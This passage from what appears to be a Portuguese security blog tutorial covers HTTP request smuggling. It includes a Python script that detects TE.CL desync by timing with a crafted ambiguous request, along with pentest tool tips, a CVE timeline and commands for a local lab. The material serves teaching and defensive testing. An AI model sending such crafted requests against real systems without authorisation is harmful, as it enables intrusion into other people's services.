| **Backend** | Priorizar TE sobre CL (RFC compliant) |
| **Backend** | Rejeitar requisições ambíguas com 400 |
| **Rede** | Desabilitar connection reuse entre clientes diferentes |
| **WAF** | Regras específicas para detectar payloads de smuggling |

---

## 12. Detectando Request Smuggling em Pentests

### Técnica de detecção: timing differential

A forma mais confiável de detectar smuggling sem causar impacto é usar **timing**. A ideia: enviar uma requisição que, se o backend interpretar diferente do proxy, vai causar um **timeout** na resposta.

```python
#!/usr/bin/env python3
"""detect_tecl.py: detecta TE.CL via timing."""

import socket
import time
import sys


def detect_tecl(host, port):
    """
    Lógica:
    - Proxy vê TE:chunked → chunk "0\r\n\r\n" = body vazio → encaminha
    - Backend vê CL:6 → espera 6 bytes de body
    - Mas o proxy só encaminhou "0\r\n\r\n" (5 bytes)
    - Backend fica esperando o 6º byte → TIMEOUT
    """
    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: 6\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))

    start = time.time()
    sock.sendall(payload)

    try:
        resp = sock.recv(4096)
        elapsed = time.time() - start
        print(f"[*] Resposta em {elapsed:.2f}s: provavelmente nao vulneravel")
    except socket.timeout:
        elapsed = time.time() - start
        print(f"[+] TIMEOUT ({elapsed:.2f}s): possivel TE.CL!")

    sock.close()


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    detect_tecl(host, port)
```

### Ferramentas

- **HTTP Request Smuggler** (extensão Burp Suite): automatiza detecção de todas as variantes
- **smuggler.py** (github.com/defparam/smuggler): scanner CLI
- **h2csmuggler**: específico para HTTP/2 cleartext upgrade smuggling
- **Turbo Intruder** (Burp): para single-packet attacks e race conditions

### Dicas práticas para pentest

1. **Sempre testar com timing primeiro.** Não envie payloads destrutivos sem confirmar a vulnerabilidade.
2. **Testar todas as variantes.** CL.TE, TE.CL, TE.TE, H2.CL, H2.TE.
3. **Testar obfuscação de TE.** Espaços, tabs, case variation, line folding.
4. **Verificar connection reuse.** Se o proxy não reutiliza conexões, smuggling não tem impacto em outros usuários.
5. **Documentar o impacto.** Smuggling sozinho é "médio"; smuggling + bypass de auth ou cache poisoning é crítico.

---

## 13. Timeline e Referências Históricas

| Ano | Evento |
|-----|--------|
| 2005 | Watchfire publica "HTTP Request Smuggling" (paper original) |
| 2005-2019 | Classe de vulnerabilidade largamente ignorada pela indústria |
| 2019 | James Kettle apresenta "HTTP Desync Attacks" na DEF CON 27 |
| 2019 | Múltiplos CVEs em proxies (HAProxy, Nginx, Apache Traffic Server) |
| 2020 | AWS adiciona desync mitigation mode ao ALB |
| 2021 | Kettle publica pesquisa sobre HTTP/2 request smuggling |
| 2022 | CVEs em Node.js, Golang net/http, e outros por parsing inconsistente |
| 2023 | "Smashing the State Machine" na DEF CON 31, race conditions via desync |
| 2024 | CONTINUATION Flood (CVE-2024-27316, CVE-2024-24549) |
| 2024 | HTTP/2 Rapid Reset (CVE-2023-44487) usado em DDoS massivos |

---

## Conclusão

Request smuggling é uma daquelas classes de vulnerabilidade que te faz repensar coisas que você achava que entendia. HTTP parece simples. Proxy na frente do backend parece seguro. Conexões keep-alive parecem uma otimização inofensiva. Até você perceber que cada componente na cadeia tem seu próprio parser, suas próprias idiossincrasias, e que a discordância entre eles é explorável.

O que me fascina nessa classe de vulnerabilidade é que ela não é um bug de implementação isolado, é um problema **arquitetural**. Você pode ter cada componente individualmente correto e ainda assim ter smuggling, porque o problema está na **interação** entre eles. É o tipo de coisa que só aparece quando você olha o sistema como um todo, não cada peça separadamente.

A pesquisa do James Kettle (tanto a de 2019 quanto a de 2023) mostrou que esse tipo de dessincronização é muito mais amplo do que request smuggling. Race conditions, state machine confusion, parser differentials... são todas manifestações do mesmo problema: sistemas distribuídos são difíceis de manter consistentes, e adversários sofisticados exploram exatamente essas inconsistências.

Se você trabalha com infraestrutura web, a mensagem é clara: **não confie que seus componentes concordam sobre o que estão processando**. Teste. Valide. Use modos estritos. E mantenha tudo atualizado.

### Reproduzindo o lab

Todo o código está no repositório [github.com/renansj/http-smuggling-lab](https://github.com/renansj/http-smuggling-lab):

```bash
git clone https://github.com/renansj/http-smuggling-lab.git
cd http-smuggling-lab

# Compilar
gcc -o backend backend.c -lpthread
gcc -o proxy proxy.c -lpthread

# Rodar (em terminais separados)
./backend 9090
./proxy 8080 9090

# Explorar
python3 smuggle_demo.py 127.0.0.1 9090   # direto no backend
python3 smuggle_tecl.py 127.0.0.1 8080   # via proxy
```

### Leitura recomendada

- [HTTP Desync Attacks: Smashing into the Cell Next Door](https://portswigger.net/research/http-desync-attacks-smashing-into-the-cell-next-door) (James Kettle, 2019)
- [Smashing the State Machine: The True Potential of Web Race Conditions](https://portswigger.net/research/smashing-the-state-machine) (James Kettle, 2023)
- [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2) (James Kettle, 2021)
- [RFC 7230 §3.3.3: Message Body Length](https://tools.ietf.org/html/rfc7230#section-3.3.3)
- [AWS ALB Desync Mitigation](https://docs.aws.amazon.com/elasticloadbalancing/latest/application/application-load-balancers.html#desync-mitigation-mode)
- [PortSwigger Web Security Academy: Request Smuggling Labs](https://portswigger.net/web-security/request-smuggling)
